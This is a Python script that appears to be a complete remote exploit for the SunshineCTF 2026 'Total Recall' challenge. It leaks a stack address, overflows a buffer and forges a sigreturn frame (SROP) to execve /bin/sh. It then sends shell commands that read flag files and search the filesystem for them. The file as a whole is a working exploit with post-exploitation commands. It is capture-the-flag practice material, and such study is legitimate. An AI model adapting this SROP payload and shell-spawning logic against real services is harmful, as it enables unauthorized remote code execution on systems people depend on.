#!/usr/bin/env python3
"""Remote SROP exploit for SunshineCTF 2026 Total Recall."""
import struct, socket, time, select, sys

HOST, PORT = "chal.sunshinectf.org", 26003
READ = 0x40104f      # func2: read(0, rsp-0x80, 0x400); ret  (returns count -> rax)
SYSCALL = 0x401014   # syscall instruction

def p64(v): return struct.pack('<Q', v)

def build_payload(leak):
    frame_addr = leak + 16
    path_addr = frame_addr + 0x200
    frame = bytearray(0x200)
    regs = {0x68: path_addr, 0x70: 0, 0x88: 0, 0x90: 59,
            0xa0: frame_addr + 0x200, 0xa8: SYSCALL, 0xb0: 0x202, 0xb8: 0x33}
    for off, val in regs.items():
        frame[off:off+8] = p64(val)
    return b'A'*0x80 + p64(READ) + p64(SYSCALL) + bytes(frame) + b'/bin/sh\0'

def recvn(s, n):
    d=b""
    while len(d)<n:
        c=s.recv(n-len(d))
        if not c: break
        d+=c
    return d

def drain(s, t=3.0):
    s.setblocking(False); buf=b""; end=time.time()+t
    while time.time()<end:
        r,_,_=select.select([s],[],[],0.4)
        if r:
            try:
                c=s.recv(4096)
                if not c: break
                buf+=c; end=time.time()+t
            except: break
    return buf

def main():
    s=socket.create_connection((HOST,PORT)); s.settimeout(8)
    leak=struct.unpack('<Q', recvn(s,8))[0]
    print(f'[+] leak={leak:#x}', flush=True)
    s.sendall(b'A'*24); time.sleep(0.2)
    s.sendall(build_payload(leak)); time.sleep(0.4)
    s.sendall(b'B'*15); time.sleep(0.4)
    s.sendall(b'echo ===PWN===; id; cat flag* /flag* /home/*/flag* 2>/dev/null; ls -la;\n')
    out=drain(s)
    print(out.decode(errors='replace'))
    # try harder for flag
    if b'sun{' not in out:
        s.setblocking(True)
        try:
            s.sendall(b'find / -name "flag*" 2>/dev/null | head; cat $(find / -name "flag*" 2>/dev/null|head -1) 2>/dev/null;\n')
            print(drain(s).decode(errors='replace'))
        except Exception as e:
            print("err", e)

if __name__=='__main__':
    main()
